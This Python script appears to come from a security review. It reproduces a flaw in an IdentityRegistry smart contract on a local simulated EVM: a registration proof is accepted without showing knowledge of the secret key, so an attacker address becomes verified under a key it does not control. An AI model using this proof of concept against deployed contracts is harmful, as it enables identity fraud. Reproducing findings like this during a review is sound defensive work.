# Run: PYTHONPATH=. python scripts/review/evm_uncontrolled_register.py
"""Review finding 9, executed on a real EVM (in-process revm):
IdentityRegistry.register accepts a NIZK that never proves pk = sk*G.
The attacker encrypts mG to a NUMS public key they do not hold and still
becomes isVerified.  Honest control: the same credential under a key the
registrant does hold also registers (different address).
"""
from web3 import Web3

from alberta_buck.sim.pyrevm_backend import PyrevmAnvil, DEV_ACCOUNTS
from alberta_buck.sim.chain import Chain
from alberta_buck.review.examples import Account, seeded, uncontrolled_registration
from alberta_buck.wallet.bn254 import G1, mul, eq, point_to_words
from alberta_buck.wallet.ps import ps_sign, ps_rerandomize
from alberta_buck.wallet.nizk import registration_prove
from alberta_buck.wallet.elgamal import elgamal_decrypt

g1 = lambda P: tuple(point_to_words(P))
g2 = lambda P: ((int(P[0].coeffs[0]), int(P[0].coeffs[1])),
                (int(P[1].coeffs[0]), int(P[1].coeffs[1])))


with PyrevmAnvil(chain_id=1, auto_impersonate=True) as anvil:
    chain = Chain(anvil.w3, DEV_ACCOUNTS[0])
    gov = DEV_ACCOUNTS[0]
    reg = chain.deploy("IdentityRegistry", gov)

    attacker = Web3.to_checksum_address("0x0000000000000000000000000000000000000bad")
    anvil.set_balance(attacker, 10**18)
    issuer, owner, pk, E, sigma, proof = uncontrolled_registration(int(attacker, 16))
    assert not eq(pk, mul(G1, owner.sk))

    iss_addr = Web3.to_checksum_address("0x00000000000000000000000000000000000000aa")
    chain.send(reg.functions.trustIssuer(iss_addr, (g2(issuer.pk_X), g2(issuer.pk_Y))),
               sender=gov)
    chain.send(reg.functions.register(
        iss_addr, g1(pk), (g1(E.R), g1(E.C)),
        (g1(sigma.sigma_1), g1(sigma.sigma_2)),
        (proof.e, proof.s_m, proof.s_r, g1(proof.A_ps), g1(proof.T_C), g1(proof.T_R))),
        sender=attacker)
    assert reg.functions.isVerified(attacker).call()
    stored = reg.functions.pkOf(attacker).call()
    print("register() accepted NUMS pk with no known sk")
    print("   isVerified(attacker) =", True)
    print("   stored pk matches NUMS point =", stored[0] == g1(pk)[0])
    # Cannot decrypt E without sk (try owner's sk: wrong key).
    try:
        opened = elgamal_decrypt(E, owner.sk)
        decrypted_with_owner_sk = eq(opened, owner.M)
    except Exception:
        decrypted_with_owner_sk = False
    print("   owner.sk decrypts the registered ciphertext to M =", decrypted_with_owner_sk)

    # Honest control on a second address.
    honest = Web3.to_checksum_address("0x000000000000000000000000000000000000a11c")
    anvil.set_balance(honest, 10**18)
    alice = Account(12345, 45678, 98765)
    rng = seeded(11)
    sig_h, _ = ps_rerandomize(ps_sign(issuer, alice.m, rng=rng), rng=rng)
    pf = registration_prove(sig_h, alice.m, alice.r, alice.pk, alice.E,
                            int(honest, 16), rng=rng)
    chain.send(reg.functions.register(
        iss_addr, g1(alice.pk), (g1(alice.E.R), g1(alice.E.C)),
        (g1(sig_h.sigma_1), g1(sig_h.sigma_2)),
        (pf.e, pf.s_m, pf.s_r, g1(pf.A_ps), g1(pf.T_C), g1(pf.T_R))),
        sender=honest)
    assert reg.functions.isVerified(honest).call()
    print("HONEST register under a held key accepted =", True)

    print("\nRESULT: finding 9 reproduced on EVM "
          "(registration without knowledge of sk).")
